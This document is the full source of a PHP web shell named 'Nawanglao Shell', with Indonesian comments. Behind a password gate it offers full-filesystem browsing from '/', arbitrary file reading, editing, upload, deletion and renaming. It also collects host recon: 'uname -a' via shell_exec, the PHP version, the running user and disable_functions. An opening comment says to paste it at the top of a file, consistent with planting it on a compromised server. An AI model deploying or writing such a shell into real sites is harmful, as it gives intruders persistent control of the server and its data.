<?php
declare(strict_types=1);

/* =========[ PASSWORD-ONLY GATE â€” paste paling atas file ]========= */

# 1) GANTI hash di bawah dengan hasil password_hash('passwordmu', PASSWORD_DEFAULT)
const FM_SECRET_HASH = '$2y$10$a1K97JAkJsMzE/YpDkcYYOvJ4TEB7B99pXIYj5/H0E8EAamXznnOW';

# (Opsional) batasi path cookie biar sesi hanya untuk filemanager ini
$cookie_path = dirname($_SERVER['SCRIPT_NAME'] ?? '/') ?: '/';

# 2) Konfigurasi sesi yang aman
session_name('neirra_fm');
session_set_cookie_params([
  'lifetime' => 0,               // sesi berakhir saat browser ditutup
  'path'     => $cookie_path,
  'domain'   => '',              // biarkan default
  'secure'   => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off',
  'httponly' => true,
  'samesite' => 'Lax',
]);
session_start();

# 3) Logout
if (isset($_GET['logout'])) {
    $_SESSION = [];
    if (ini_get('session.use_cookies')) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time()-42000, $params['path'], $params['domain'] ?? '', (bool)$params['secure'], (bool)$params['httponly']);
    }
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

# 4) Rate-limit sederhana (di memori sesi)
$_SESSION['fm_fail']  = $_SESSION['fm_fail']  ?? 0;
$_SESSION['fm_last']  = $_SESSION['fm_last']  ?? 0;
$cooldown = 2 * min($_SESSION['fm_fail'], 5); // max 10 detik cooldown

# 5) Proses login (POST password)
if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST' && isset($_POST['fm_password'])) {
    if (time() - (int)$_SESSION['fm_last'] < $cooldown) {
        $err = 'Tunggu sebentar sebelum mencoba lagi.';
    } elseif (password_verify((string)$_POST['fm_password'], FM_SECRET_HASH)) {
        session_regenerate_id(true);
        $_SESSION['fm_auth'] = true;
        $_SESSION['fm_fail'] = 0;
        $_SESSION['fm_last'] = time();
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?')); // redirect bersih
        exit;
    } else {
        $_SESSION['fm_fail']++;
        $_SESSION['fm_last'] = time();
        $err = 'Password salah.';
    }
}

# 6) Gate: bila belum login, tampilkan form lalu STOP
if (empty($_SESSION['fm_auth'])) {
    http_response_code(401);
    ?>
    <!doctype html>
    <html lang="id">
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Login</title>
      <style>
        :root { --bg:#0f1216; --card:#141a20; --fg:#e6e6e6; --muted:#9aa4af; --acc:#4fd1c5; --danger:#f87171; --border:#25303a; }
        *{box-sizing:border-box} body{margin:0;min-height:100vh;display:grid;place-items:center;background:var(--bg);color:var(--fg);font:14px/1.5 system-ui,Segoe UI,Roboto}
        .card{width:min(420px,92vw);background:var(--card);border:1px solid var(--border);border-radius:14px;padding:20px}
        h1{margin:0 0 10px;font-size:18px} p{margin:0 0 16px;color:var(--muted)}
        .row{display:flex;gap:8px}
        input[type=password]{flex:1;background:#11161b;border:1px solid var(--border);border-radius:10px;color:var(--fg);padding:10px 12px;outline:none}
        button{background:#182028;border:1px solid var(--border);color:var(--fg);padding:10px 14px;border-radius:10px;cursor:pointer}
        button:hover{background:#1d2630}
        .err{color:var(--danger);margin:8px 0 0;font-size:12px}
        .hint{margin-top:10px;color:var(--muted);font-size:12px}
      </style>
    </head>
    <body>
      <form class="card" method="post" autocomplete="off">
        <h1>Password</h1>
        <p>-</p>
        <div class="row">
          <input type="password" name="fm_password" placeholder="Password" autofocus required>
          <button type="submit">Login</button>
        </div>
        <?php if (!empty($err)): ?><div class="err"><?=htmlspecialchars($err)?></div><?php endif; ?>
        <?php if ($_SESSION['fm_fail']>0): ?><div class="hint">Percobaan gagal: <?= (int)$_SESSION['fm_fail'] ?>.</div><?php endif; ?>
      </form>
    </body>
    </html>
    <?php
    exit;
}
/* =======================[ END PASSWORD GATE ]======================= */


// ------- Anti-cache (penting agar tabel ter-update) -------
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Cache-Control: post-check=0, pre-check=0', false);
header('Pragma: no-cache');

// -------------------------------
// Config
// -------------------------------
$BASE_PATH      = realpath(__DIR__) ?: __DIR__;
$MAX_EDIT_BYTES = 2 * 1024 * 1024; // 2 MB

// Izinkan navigasi absolut hanya ke prefix berikut (sesuaikan kebutuhan)
$ALLOW_ABSOLUTE  = true;
$ALLOWED_PREFIXES = [
    '/',        // root (tetap tunduk open_basedir & permission)
    '/home',
    '/tmp',
    $BASE_PATH, // selalu izinkan direktori script
];

// -------------------------------
// Helpers
// -------------------------------
function is_disabled(string $fn): bool {
    $df = ini_get('disable_functions') ?: '';
    $disabled = array_filter(array_map('trim', explode(',', $df)));
    return in_array($fn, $disabled, true) || !function_exists($fn);
}

function path_is_allowed(string $path): bool {
    global $ALLOWED_PREFIXES;
    $real = realpath($path);
    if ($real === false) $real = rtrim($path, DIRECTORY_SEPARATOR);
    $real = rtrim($real, DIRECTORY_SEPARATOR) ?: DIRECTORY_SEPARATOR;

    foreach ((array)$ALLOWED_PREFIXES as $pref) {
        $p = realpath($pref);
        if ($p === false) $p = rtrim($pref, DIRECTORY_SEPARATOR);
        $p = rtrim($p, DIRECTORY_SEPARATOR) ?: DIRECTORY_SEPARATOR;
        if ($pref === '/' || strpos($real, $p) === 0) return true;
    }
    return false;
}

function safe_join(string $base, string $path): string {
    $path = str_replace(["\0"], '', $path);
    $baseReal = realpath($base) ?: $base;

    // Path absolut?
    global $ALLOW_ABSOLUTE;
    if (!empty($ALLOW_ABSOLUTE) && $path !== '' && $path[0] === DIRECTORY_SEPARATOR) {
        $real = realpath($path);
        if ($real === false) $real = rtrim($path, DIRECTORY_SEPARATOR);
        return path_is_allowed($real) ? $real : $baseReal;
    }

    // Path relatif
    if ($path === '' || $path === DIRECTORY_SEPARATOR) return $baseReal;
    $joined = $baseReal . DIRECTORY_SEPARATOR . ltrim($path, DIRECTORY_SEPARATOR);
    $real = realpath($joined);
    if ($real === false) $real = $joined;

    // Jika absolut dimatikan, cegah breakout dari base
    if (empty($ALLOW_ABSOLUTE) && strpos($real, $baseReal) !== 0) return $baseReal;

    // Jika absolut diizinkan, cek whitelist
    if (!path_is_allowed($real)) return $baseReal;

    return $real;
}

function current_path(string $base): string {
    $p = isset($_GET['p']) ? (string)$_GET['p'] : $base;
    return safe_join($base, $p);
}

function fmt_bytes(int $bytes): string {
    if ($bytes < 1024) return $bytes . ' B';
    $units = ['KB','MB','GB','TB'];
    $i = 0; $val = $bytes / 1024;
    while ($val >= 1024 && $i < count($units)-1) { $val /= 1024; $i++; }
    return sprintf('%.2f %s', $val, $units[$i]);
}

// Bentuk string permission lengkap (d/- l s S t T) seperti ls -l
function perm_symbolic(string $f): string {
    $perms = @fileperms($f);
    if ($perms === false) return '---------';

    if (($perms & 0xC000) === 0xC000) $info = 's'; // socket
    elseif (($perms & 0xA000) === 0xA000) $info = 'l'; // symlink
    elseif (($perms & 0x8000) === 0x8000) $info = '-'; // regular
    elseif (($perms & 0x6000) === 0x6000) $info = 'b'; // block
    elseif (($perms & 0x4000) === 0x4000) $info = 'd'; // dir
    elseif (($perms & 0x2000) === 0x2000) $info = 'c'; // char
    elseif (($perms & 0x1000) === 0x1000) $info = 'p'; // fifo
    else $info = 'u'; // unknown

    // owner
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040)
        ? (($perms & 0x0800) ? 's' : 'x')
        : (($perms & 0x0800) ? 'S' : '-');

    // group
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008)
        ? (($perms & 0x0400) ? 's' : 'x')
        : (($perms & 0x0400) ? 'S' : '-');

    // others
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001)
        ? (($perms & 0x0200) ? 't' : 'x')
        : (($perms & 0x0200) ? 'T' : '-');

    return $info;
}

// Tentukan class warna berdasarkan izin efektif proses PHP
function perm_class(string $path): string {
    if (@is_writable($path)) return 'perm-write';   // hijau
    if (@is_readable($path)) return 'perm-read';    // putih
    if (!@is_readable($path) && @is_executable($path)) return 'perm-none';
    return 'perm-none';                              // merah
}

// Renderer: satu span, satu warna
function perm_render(string $path): string {
    $sym  = perm_symbolic($path);
    $cls  = perm_class($path);
    return '<span class="perm-mono '.$cls.'">'.htmlspecialchars($sym, ENT_QUOTES, 'UTF-8').'</span>';
}


function file_icon(string $name, bool $isDir): string {
    if ($isDir) return 'fa-folder';
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    return match ($ext) {
        'php','phpt','phtml','html','htm','css','js','mjs','cjs' => 'fa-file-code-o',
        'json','yml','yaml','xml','ini','conf','log','txt','md'   => 'fa-file-text-o',
        'jpg','jpeg','png','gif','webp','bmp','svg','ico','avif'  => 'fa-file-image-o',
        'zip','rar','7z','gz','bz2','xz','tar'                    => 'fa-file-archive-o',
        'pdf' => 'fa-file-pdf-o',
        'doc','docx' => 'fa-file-word-o',
        'xls','xlsx','csv' => 'fa-file-excel-o',
        'sql','db','sqlite' => 'fa-database',
        default => 'fa-file-o',
    };
}

function ext_to_codemirror_mode(string $name): string {
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    return match ($ext) {
        'php','phtml','phpt' => 'application/x-httpd-php',
        'html','htm'         => 'text/html',
        'css'                => 'text/css',
        'js','mjs','cjs'     => 'text/javascript',
        'xml'                => 'application/xml',
        'c','cpp','h','hpp','java' => 'text/x-csrc',
        default              => 'application/x-httpd-php',
    };
}

function json_response(array $data): void {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data);
    exit;
}

// -------------------------------
// AJAX Handlers
// -------------------------------
$cwd = current_path($BASE_PATH);

// Save file
if (isset($_POST['action']) && $_POST['action'] === 'save') {
    $path = safe_join($BASE_PATH, (string)($_POST['path'] ?? ''));
    $content = (string)($_POST['content'] ?? '');
    if (!is_file($path)) json_response(['ok'=>false, 'msg'=>'Target bukan file.']);
    $ok = @file_put_contents($path, $content);
    json_response(['ok' => $ok !== false, 'msg' => $ok !== false ? 'Tersimpan.' : 'Gagal menyimpan.']);
}

// Read file
if (isset($_GET['action']) && $_GET['action'] === 'read') {
    $path = safe_join($BASE_PATH, (string)($_GET['path'] ?? ''));
    if (!is_file($path)) json_response(['ok'=>false, 'msg'=>'File tidak ditemukan.']);
    $size = @filesize($path) ?: 0;
    if ($size > $MAX_EDIT_BYTES) {
        json_response(['ok'=>false, 'msg'=>'File terlalu besar untuk editor (> '.fmt_bytes($MAX_EDIT_BYTES).').']);
    }
    $data = @file_get_contents($path);
    json_response(['ok'=>true, 'name'=>basename($path), 'mode'=>ext_to_codemirror_mode($path), 'content'=>$data]);
}

// Delete
if (isset($_POST['action']) && $_POST['action'] === 'delete') {
    $path = safe_join($BASE_PATH, (string)($_POST['path'] ?? ''));
    $ok = false;
    if (is_dir($path)) {
        // Hanya hapus folder kosong
        $ok = @rmdir($path);
    } elseif (is_file($path)) {
        $ok = @unlink($path);
    }
    json_response(['ok'=>$ok, 'msg'=>$ok?'Terhapus.':'Gagal menghapus (pastikan folder kosong & permission cukup).']);
}

// Rename
if (isset($_POST['action']) && $_POST['action'] === 'rename') {
    $path = safe_join($BASE_PATH, (string)($_POST['path'] ?? ''));
    $newName = trim((string)($_POST['newname'] ?? ''));
    if ($newName === '') json_response(['ok'=>false, 'msg'=>'Nama baru kosong.']);
    $target = dirname($path) . DIRECTORY_SEPARATOR . $newName;
    $ok = @rename($path, $target);
    json_response(['ok'=>$ok, 'msg'=>$ok?'Berhasil rename.':'Gagal rename.', 'newpath'=>$target]);
}

// Create (file/folder)
if (isset($_POST['action']) && $_POST['action'] === 'create') {
    $type = (string)($_POST['type'] ?? '');
    $name = trim((string)($_POST['name'] ?? ''));
    $dir = safe_join($BASE_PATH, (string)($_POST['dir'] ?? $cwd));
    if ($name === '') json_response(['ok'=>false, 'msg'=>'Nama tidak boleh kosong.']);
    $target = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
    $ok = false;
    if ($type === 'file') {
        if (!file_exists($target)) $ok = @touch($target);
    } elseif ($type === 'folder') {
        if (!file_exists($target)) $ok = @mkdir($target, 0755, false);
    }
    json_response(['ok'=>$ok, 'msg'=>$ok?'Berhasil dibuat.':'Gagal membuat (mungkin sudah ada).']);
}

// Upload
if (isset($_POST['action']) && $_POST['action'] === 'upload') {
    $dir = safe_join($BASE_PATH, (string)($_POST['dir'] ?? $cwd));
    $countOK = 0; $countFail = 0;
    if (!empty($_FILES['files']) && is_array($_FILES['files']['name'])) {
        foreach ($_FILES['files']['name'] as $i => $name) {
            if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) {
                $tmp = $_FILES['files']['tmp_name'][$i];
                $dest = $dir . DIRECTORY_SEPARATOR . $name;
                if (@move_uploaded_file($tmp, $dest)) $countOK++; else $countFail++;
            } else {
                $countFail++;
            }
        }
    }
    json_response(['ok'=> $countFail===0, 'msg'=>"Upload selesai: $countOK ok, $countFail gagal."]);
}

// --------------------------------
// Data untuk UI
// --------------------------------
$uname = '';
if (!is_disabled('shell_exec')) {
    $uname = @shell_exec('uname -a') ?: '';
}
if ($uname === '') {
    $uname = php_uname('a');
}
$phpver = PHP_VERSION;
$user = function_exists('posix_geteuid') && function_exists('posix_getpwuid')
    ? (posix_getpwuid(posix_geteuid())['name'] ?? get_current_user())
    : get_current_user();
$disable_functions = ini_get('disable_functions') ?: 'â€”';

// Normalisasi CWD
$cwd = safe_join($BASE_PATH, isset($_GET['p']) ? (string)$_GET['p'] : $BASE_PATH);

// Listing
$entries = [];
if (is_dir($cwd) && ($dh = @opendir($cwd))) {
    while (($e = readdir($dh)) !== false) {
        if ($e === '.' ) continue;
        if ($e === '..') {
            // Tampilkan ".." hanya jika di luar BASE saat absolut dimatikan
            if (realpath($cwd) === realpath($BASE_PATH)) continue;
        }
        $full = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $e;
        $isDir = @is_dir($full);
        $entries[] = [
        'name'  => $e,
        'full'  => $full,
        'isDir' => $isDir,
        'size'  => $isDir ? 0 : (@filesize($full) ?: 0),
        'mtime' => @filemtime($full) ?: 0,
      ];
    }
    closedir($dh);
}
// Sort: folder dulu
usort($entries, function($a, $b) {
    if ($a['isDir'] !== $b['isDir']) return $a['isDir'] ? -1 : 1;
    return strnatcasecmp($a['name'], $b['name']);
});

// Breadcrumb (klik hanya jika path diizinkan)
function breadcrumb_html(string $base, string $path): string {
    $real = realpath($path) ?: ($path ?: DIRECTORY_SEPARATOR);
    $real = rtrim($real, DIRECTORY_SEPARATOR) ?: DIRECTORY_SEPARATOR;
    $segs = $real === DIRECTORY_SEPARATOR ? [] : explode(DIRECTORY_SEPARATOR, ltrim($real, DIRECTORY_SEPARATOR));

    $accum = DIRECTORY_SEPARATOR;
    $out = [];
    // Root
    $rootAllowed = path_is_allowed(DIRECTORY_SEPARATOR);
    $rootHref = $rootAllowed ? ('?p=' . rawurlencode(DIRECTORY_SEPARATOR)) : '';
    $out[] = $rootHref
      ? '<a class="crumb" href="'.$rootHref.'">sss</a>'
      : '<span class="crumb muted">/</span>';

    foreach ($segs as $idx => $seg) {
        $accum = rtrim($accum, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $seg;
        $allowed = path_is_allowed($accum);
        $out[] = '<span class="sep">/</span>';
        if ($allowed) {
            $out[] = '<a class="crumb" href="?p='.rawurlencode($accum).'">'.htmlspecialchars($seg).'</a>';
        } else {
            $out[] = '<span class="crumb muted">'.htmlspecialchars($seg).'</span>';
        }
    }
    return implode('', $out);
}

?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Nawanglao Shell</title>

<!-- Libraries (sesuai permintaan) -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/php/php.min.js"></script>
<!-- Tambahan mode HTMLmixed -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/htmlmixed/htmlmixed.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/css/css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/clike/clike.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>

<style>
:root {
    --bg: #111417;
    --fg: #e6e6e6;
    --muted: #a0a0a0;
    --acc: #4fd1c5;
    --danger: #f56565;
    --warning: #f6ad55;
    --ok: #68d391;
    --card: #161a1e;
    --border: #2a2f35;
}
* { box-sizing: border-box; }
body {
    margin: 0; padding: 16px;
    background: var(--bg);
    color: var(--fg);
    font: 14px/1.5 system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, "Helvetica Neue", Arial, "Noto Sans", "Apple Color Emoji","Segoe UI Emoji";
}
.header {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 14px;
    padding: 14px 16px;
    margin-bottom: 12px;
}
.header .row { display: flex; flex-wrap: wrap; gap: 10px 24px; align-items: center; }
.header .badge { display:inline-flex; align-items:center; gap:8px; padding:6px 10px; border-radius:999px; border:1px solid var(--border); background:#12161a; }
.header .badge i { opacity: .9; }
.header .muted { color: var(--muted); }
.pwd {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 10px 12px; margin-bottom: 10px;
    display:flex; justify-content:space-between; align-items:center; gap: 10px;
}
.pwd .crumb { color: var(--acc); text-decoration: none; }
.pwd .crumb:hover { text-decoration: underline; }
.pwd .crumb.muted { color: #6b7280; cursor: default; text-decoration: none; }
.pwd .sep { color: var(--muted); margin: 0 4px; }
.toolbar { display:flex; gap:8px; flex-wrap: wrap; }
.btn {
    display:inline-flex; align-items:center; gap:8px;
    background:#1b2127; border:1px solid var(--border); color:var(--fg);
    padding:8px 12px; border-radius:10px; cursor:pointer; text-decoration:none;
}
.btn:hover { background:#222830; }
.btn.danger { border-color:#3a1f24; color:#ffd4d4; background:#2a0f12; }
.btn.ok { border-color:#224437; background:#0f2820; }
table {
    width: 100%; border-collapse: collapse; overflow:hidden;
    border:1px solid var(--border); border-radius: 12px; background: var(--card);
}
th, td { padding: 10px 12px; border-bottom: 1px solid var(--border); }
th { text-align:left; font-weight:600; color:#b9c0c8; background:#14181d; position:sticky; top:0; }
tr:hover td { background:#171c22; }
.name a { color: var(--fg); text-decoration:none; }
.name a:hover { color: var(--acc); }
.actions a { margin-right: 8px; cursor:pointer; text-decoration:none; }
.size, .mtime, .perm { color: var(--muted); white-space:nowrap; }
footer { margin-top:12px; color: var(--muted); font-size:12px; }
.cm-editor { height: 70vh; }
.swal2-popup { width: min(960px, 95vw) !important; }
.perm-mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; letter-spacing: .5px; }

.perm-write { color: #0f0; }    /* bisa tulis */
.perm-read  { color: #e8e8e8; } /* hanya bisa baca */
.perm-none  { color: #f00; }    /* tidak bisa baca (efektif: akses nol) */
</style>
</head>
<body>

<div class="header">
  <div class="row">
    <div class="badge" title="Kernel/Distro">
      <i class="fa fa-linux"></i> <span><?php echo htmlspecialchars($uname); ?></span>
    </div>
    <div class="badge" title="PHP Version">
      <i class="fa fa-code"></i> <span>PHP <?php echo htmlspecialchars($phpver); ?></span>
    </div>
    <div class="badge" title="Current User">
      <i class="fa fa-user"></i> <span><?php echo htmlspecialchars((string)$user); ?></span>
    </div>
    <div class="badge" title="disable_functions">
      <i class="fa fa-ban"></i> <span>disable_functions: <span class="muted"><?php echo htmlspecialchars($disable_functions) ?: 'â€”'; ?></span></span>
    </div>
  </div>
</div>

<div class="pwd">
  <div style="flex:1; min-width: 260px;">
    <strong>PWD:</strong>
    <?php echo breadcrumb_html($BASE_PATH, $cwd); ?>
  </div>
  <div class="toolbar">
    <label class="btn">
      <i class="fa fa-upload"></i> Upload
      <input id="uploader" type="file" name="files[]" multiple style="display:none">
    </label>
    <a class="btn" href="#" id="btnCreate"><i class="fa fa-plus"></i> Create</a>
  </div>
</div>

<table>
  <thead>
    <tr>
      <th style="width:42%;">Name</th>
      <th style="width:12%;">Size</th>
      <th style="width:20%;">Modified</th>
      <th style="width:12%;">Perm</th>
      <th style="width:14%;">Actions</th>
    </tr>
  </thead>
  <tbody>
    <?php
      // Tampilkan row naik ke atas jika tidak di root/base
      $atRoot = ($cwd === DIRECTORY_SEPARATOR);
      $atBase = (realpath($cwd) === realpath($BASE_PATH));
      $showUp = $ALLOW_ABSOLUTE ? (!$atRoot) : (!$atBase);
      if ($showUp):
        $parent = rtrim(dirname($cwd), DIRECTORY_SEPARATOR);
        if ($parent === '') $parent = DIRECTORY_SEPARATOR;
    ?>
    <tr>
      <td class="name">
        <i class="fa fa-level-up"></i>
        <a href="?p=<?php echo rawurlencode($parent); ?>">.. (up)</a>
      </td>
      <td class="size">â€”</td>
      <td class="mtime">â€”</td>
      <td class="perm">â€”</td>
      <td class="actions">â€”</td>
    </tr>
    <?php endif; ?>

    <?php foreach ($entries as $e): ?>
      <?php
        $isDir = $e['isDir'];
        $icon = file_icon($e['name'], $isDir);
        $href = $isDir ? '?p='.rawurlencode($e['full']) : '#';
        $mtime = $e['mtime'] ? date('Y-m-d H:i:s', $e['mtime']) : 'â€”';
      ?>
      <tr data-full="<?php echo htmlspecialchars($e['full']); ?>" data-isdir="<?php echo $isDir ? '1':'0'; ?>">
        <td class="name">
          <i class="fa <?php echo $icon; ?>"></i>
          <?php if ($isDir): ?>
            <a href="<?php echo $href; ?>"><?php echo htmlspecialchars($e['name']); ?></a>
          <?php else: ?>
            <a href="#" class="open-file" data-file="<?php echo htmlspecialchars($e['full']); ?>" data-name="<?php echo htmlspecialchars($e['name']); ?>">
              <?php echo htmlspecialchars($e['name']); ?>
            </a>
          <?php endif; ?>
        </td>
        <td class="size"><?php echo $isDir ? 'â€”' : fmt_bytes((int)$e['size']); ?></td>
        <td class="mtime"><?php echo $mtime; ?></td>
        <td class="perm"><?php echo perm_render($e['full']); ?></td>
        <td class="actions">
          <a class="rename" title="Rename"><i class="fa fa-pencil"></i></a>
          <a class="delete danger" title="Delete"><i class="fa fa-trash"></i></a>
        </td>
      </tr>
    <?php endforeach; ?>
  </tbody>
</table>

<footer>
  Base: <?php echo htmlspecialchars($BASE_PATH); ?> â€”
  <span class="muted">Nawanglao Shell</span>
</footer>

<script>
const cwd = <?php echo json_encode($cwd); ?>;

function hardReload() {
  const url = new URL(window.location.href);
  url.searchParams.set('_', Date.now().toString());
  window.location.replace(url.toString());
}

function toast(icon, title, timer=1400) {
  Swal.fire({toast:true, position:'top-end', showConfirmButton:false, timer, icon, title});
}

async function readFile(path) {
  const qs = new URLSearchParams({action:'read', path});
  const res = await fetch(location.pathname + '?' + qs.toString(), {credentials:'same-origin'});
  return res.json();
}

async function saveFile(path, content) {
  const fd = new FormData();
  fd.append('action','save');
  fd.append('path', path);
  fd.append('content', content);
  const res = await fetch(location.pathname, {method:'POST', body: fd, credentials:'same-origin'});
  return res.json();
}

async function deletePath(path) {
  const fd = new FormData();
  fd.append('action','delete');
  fd.append('path', path);
  const res = await fetch(location.pathname, {method:'POST', body: fd, credentials:'same-origin'});
  return res.json();
}

async function renamePath(path, newname) {
  const fd = new FormData();
  fd.append('action','rename');
  fd.append('path', path);
  fd.append('newname', newname);
  const res = await fetch(location.pathname, {method:'POST', body: fd, credentials:'same-origin'});
  return res.json();
}

async function createThing(type, name, dir) {
  const fd = new FormData();
  fd.append('action','create');
  fd.append('type', type);
  fd.append('name', name);
  fd.append('dir', dir);
  const res = await fetch(location.pathname, {method:'POST', body: fd, credentials:'same-origin'});
  return res.json();
}

async function uploadFiles(files, dir) {
  const fd = new FormData();
  fd.append('action','upload');
  fd.append('dir', dir);
  for (const f of files) fd.append('files[]', f, f.name);
  const res = await fetch(location.pathname, {method:'POST', body: fd, credentials:'same-origin'});
  return res.json();
}

// Open editor
document.querySelectorAll('.open-file').forEach(a => {
  a.addEventListener('click', async (e) => {
    e.preventDefault();
    const path = a.dataset.file;
    const r = await readFile(path);
    if (!r.ok) return Swal.fire('Gagal', r.msg || 'Tidak bisa membuka file.', 'error');
    let editor;
    const result = await Swal.fire({
      title: r.name,
      html: '<textarea id="editorArea"></textarea>',
      width: '90%',
      showCancelButton: true,
      confirmButtonText: 'Save',
      cancelButtonText: 'Cancel',
      didOpen: () => {
        const ta = document.getElementById('editorArea');
        ta.value = r.content;
        editor = CodeMirror.fromTextArea(ta, {
          lineNumbers: true,
          theme: 'ayu-mirage',
          mode: r.mode || 'application/x-httpd-php',
          matchBrackets: true,
          autoCloseBrackets: true,
          indentUnit: 2,
          tabSize: 2
        });
        editor.setSize('100%', '60vh');
        setTimeout(() => editor.refresh(), 50);
      },
      preConfirm: async () => {
        const content = editor.getValue();
        const save = await saveFile(path, content);
        if (!save.ok) {
          Swal.showValidationMessage(save.msg || 'Gagal menyimpan');
          return false;
        }
        return true;
      }
    });
    if (result.isConfirmed) {
      toast('success', 'File tersimpan.');
      setTimeout(() => hardReload(), 200);
    }
  });
});

// Rename
document.querySelectorAll('.rename').forEach(btn => {
  btn.addEventListener('click', async (e) => {
    const tr = e.target.closest('tr');
    const full = tr.dataset.full;
    const oldname = tr.querySelector('.name').innerText.trim();
    const result = await Swal.fire({
      title: 'Rename',
      input: 'text',
      inputValue: oldname,
      inputLabel: 'Nama baru',
      showCancelButton: true,
      confirmButtonText: 'Rename'
    });
    const newname = result.value;
    if (!result.isConfirmed || !newname) return;
    const r = await renamePath(full, newname);
    if (!r.ok) return Swal.fire('Gagal', r.msg || 'Rename gagal', 'error');
    toast('success', 'Rename berhasil');
    setTimeout(() => hardReload(), 200);
  });
});

// Delete
document.querySelectorAll('.delete').forEach(btn => {
  btn.addEventListener('click', async (e) => {
    const tr = e.target.closest('tr');
    const full = tr.dataset.full;
    const isdir = tr.dataset.isdir === '1';
    const confirm = await Swal.fire({
      title: 'Hapus ' + (isdir ? 'Folder' : 'File') + '?',
      text: isdir ? 'Folder harus kosong.' : 'Tindakan tidak dapat dibatalkan.',
      icon: 'warning', showCancelButton: true, confirmButtonText: 'Hapus', confirmButtonColor:'#d33'
    });
    if (!confirm.isConfirmed) return;
    const r = await deletePath(full);
    if (!r.ok) return Swal.fire('Gagal', r.msg || 'Hapus gagal', 'error');
    toast('success', 'Terhapus');
    setTimeout(() => hardReload(), 200);
  });
});

// Create
document.getElementById('btnCreate').addEventListener('click', async () => {
  const result = await Swal.fire({
    title: 'Create',
    html: `
      <div style="display:flex; flex-direction:column; gap:10px; text-align:left">
        <label><input type="radio" name="ctype" value="file" checked> File</label>
        <label><input type="radio" name="ctype" value="folder"> Folder</label>
        <input id="cname" class="swal2-input" placeholder="Nama file atau folder">
      </div>
    `,
    focusConfirm: false,
    showCancelButton: true,
    preConfirm: () => {
      const type = (document.querySelector('input[name="ctype"]:checked') || {}).value;
      const name = (document.getElementById('cname').value || '').trim();
      if (!name) {
        Swal.showValidationMessage('Nama tidak boleh kosong');
        return false;
      }
      return {type, name};
    }
  });
  if (!result.isConfirmed || !result.value) return;
  const r = await createThing(result.value.type, result.value.name, cwd);
  if (!r.ok) return Swal.fire('Gagal', r.msg || 'Create gagal', 'error');
  toast('success', 'Berhasil dibuat');
  setTimeout(() => hardReload(), 200);
});

// Upload
document.getElementById('uploader').addEventListener('change', async (e) => {
  const files = e.target.files;
  if (!files || files.length === 0) return;
  const res = await uploadFiles(files, cwd);
  if (!res.ok) {
    Swal.fire('Upload Gagal', res.msg || 'Terjadi kesalahan.', 'error');
  } else {
    toast('success', res.msg || 'Upload selesai');
    setTimeout(() => hardReload(), 200);
  }
});
</script>

</body>
</html>
